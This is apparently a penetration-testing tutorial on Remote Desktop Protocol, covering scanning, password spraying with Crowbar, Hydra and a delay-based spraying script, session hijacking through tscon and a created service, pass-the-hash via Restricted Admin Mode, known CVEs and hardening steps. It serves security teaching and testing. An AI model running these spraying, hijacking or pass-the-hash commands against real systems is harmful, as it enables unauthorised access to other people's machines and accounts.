# RDP

## RDP Services

Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that provides a graphical interface for connecting to another computer over a network connection. It's widely used by system administrators and end users for remote access to Windows systems, making it a common target during penetration testing.

### Protocol Overview

RDP operates on TCP port 3389 by default, though this can be changed in the registry. The protocol enables:

* Full graphical access to remote systems
* File transfer capabilities
* Audio and video redirection
* Clipboard sharing
* Printer redirection

### Enumeration Techniques

#### Basic Port Scanning

```bash
# Simple port scan
nmap -Pn -p3389 192.168.2.143

# Service version detection
nmap -Pn -p3389 -sV 192.168.2.143
```

Example output:

```
PORT     STATE    SERVICE
3389/tcp open    ms-wbt-server
```

#### Banner Grabbing

```bash
# Using netcat
nc -nv 192.168.2.143 3389
```

This may not provide a traditional text banner but can confirm the service is running.

#### RDP Security Assessment

```bash
# Nmap script scan
nmap --script "rdp-*" -p 3389 -v 192.168.2.143
```

Nmap has several RDP-specific scripts that can:

* Check supported security protocols
* Test for known vulnerabilities
* Verify NLA (Network Level Authentication) settings

### Common Misconfigurations

#### Authentication Issues

RDP services can be vulnerable to authentication-related issues:

1. **Weak Credentials**: Default or easily guessed passwords
2. **No Account Lockout Policy**: Allows unlimited password attempts
3. **NLA Disabled**: Enables pre-authentication vulnerabilities

#### Password Spraying

When an account lockout policy isn't configured or is too lenient, password spraying can be effective:

```bash
# Using Crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

Example output:

```
2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

#### Using Hydra

```bash
# Password spraying with Hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

Example output:

```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

### Accessing RDP Services

#### Using rdesktop (Linux)

```bash
rdesktop -u administrator -p 'password123' 192.168.2.143
```

#### Using xfreerdp (Linux)

```bash
xfreerdp /u:administrator /p:'password123' /v:192.168.2.143
```

#### Using mstsc (Windows)

On Windows, you can use the built-in Remote Desktop Connection (mstsc.exe):

1. Press Win + R
2. Type `mstsc`
3. Enter the target IP and credentials

### Advanced Attack Techniques

#### RDP Session Hijacking

With local administrator access on a system, you can hijack other users' RDP sessions:

1. First, identify active sessions:

```cmd
query user
```

Example output:

```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

2. Create a service to execute the hijack using `tscon`:

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

3. Start the service:

```cmd
net start sessionhijack
```

This technique works by redirecting the target session to your current session, effectively taking it over without needing the user's credentials.

#### RDP Pass-the-Hash (PtH)

On systems with Restricted Admin Mode enabled, you can use NTLM hashes instead of cleartext passwords:

1. First, ensure Restricted Admin Mode is enabled on the target:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

2. Use xfreerdp with the hash:

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

If the hash is valid and Restricted Admin Mode is enabled, you'll be logged in without requiring the cleartext password.

### Known RDP Vulnerabilities

#### CVE-2019-0708 (BlueKeep)

A critical remote code execution vulnerability in Remote Desktop Services:

* Affects Windows 7, Windows Server 2008 R2, and earlier versions
* Pre-authentication and requires no user interaction
* Can potentially allow wormable malware

Detection:

```bash
nmap -p 3389 --script rdp-vuln-ms19-0708 192.168.2.143
```

#### CVE-2012-0002 (MS12-020)

A vulnerability in Remote Desktop Protocol that could allow remote code execution:

* Affects multiple versions of Microsoft Windows
* Exploitable over the RDP protocol
* Can cause denial of service

#### CVE-2020-0609/CVE-2020-0610

Remote code execution vulnerabilities in Windows Remote Desktop Gateway:

* Affects Windows Server 2012, 2012 R2, 2016, 2019
* Pre-authentication and requires no user interaction
* Enables arbitrary code execution on the gateway server

### Defensive Measures

When testing RDP services, consider these security recommendations:

#### RDP Hardening

1. **Enable Network Level Authentication (NLA)**
   * Requires user authentication before establishing a full RDP connection
   * Registry path: `HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`
   * Setting: `SecurityLayer` = 2, `UserAuthentication` = 1
2. **Implement Account Lockout Policies**
   * Prevents brute force attacks
   * Recommended: 5-10 invalid attempts before lockout
3. **Use Strong Passwords**
   * Complex passwords for all accounts with RDP access
   * Consider password management solutions
4. **Restrict RDP Access**
   * Limit RDP to specific IP addresses using Windows Firewall
   * Use VPN for remote access before allowing RDP connections
5. **Disable RDP When Not Needed**
   * Registry path: `HKLM\System\CurrentControlSet\Control\Terminal Server`
   * Setting: `fDenyTSConnections` = 1
6. **Use TLS 1.2 or Higher**
   * Provides stronger encryption
   * Registry path: `HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols`
7. **Implement Multi-Factor Authentication**
   * Adds an additional layer of security
   * Consider solutions like Duo Security, Azure MFA, etc.

### RDP Penetration Testing Methodology

When testing RDP services, follow these steps:

1. **Discovery**: Identify systems with RDP enabled
2. **Enumeration**: Determine RDP version and security settings
3. **Authentication Testing**: Test for weak credentials and password policies
4. **Security Configuration Assessment**: Check NLA, encryption level, etc.
5. **Vulnerability Testing**: Test for known RDP vulnerabilities
6. **Post-Authentication Testing**: Attempt session hijacking, escalation, etc.
7. **Reporting**: Document findings and suggest mitigation measures

### Practical Testing Scripts

#### Automated RDP Scanning Script

```bash
#!/bin/bash
# Simple RDP scanner
for ip in $(seq 1 254); do
    host="192.168.1.$ip"
    (nmap -p 3389 -T4 --open $host > /dev/null && echo "RDP open on $host") &
done
wait
```

#### Password Spraying Wrapper

```bash
#!/bin/bash
# RDP password spraying with delays to avoid lockout
TARGET=$1
USERLIST=$2
PASSWORD=$3
DELAY=$4  # Seconds between attempts

for user in $(cat $USERLIST); do
    echo "Trying user: $user"
    xfreerdp /v:$TARGET /u:$user /p:$PASSWORD /cert-ignore +auth-only 2>&1 | grep -v "CERTIFICATE"
    sleep $DELAY
done
```

### RDP Client Security Considerations

When using RDP clients during penetration testing, consider:

1. **Clipboard Sharing**: Disable if not needed to prevent data leakage
2. **Drive Redirection**: Disable to prevent accidental file exposure
3. **Client-Side Vulnerabilities**: Keep RDP clients updated
4. **Session Recording**: Consider recording sessions for documentation
5. **Network Isolation**: Use dedicated networks for penetration testing

By understanding RDP services and their security implications, penetration testers can effectively identify vulnerabilities and suggest appropriate security improvements for remote access infrastructure.
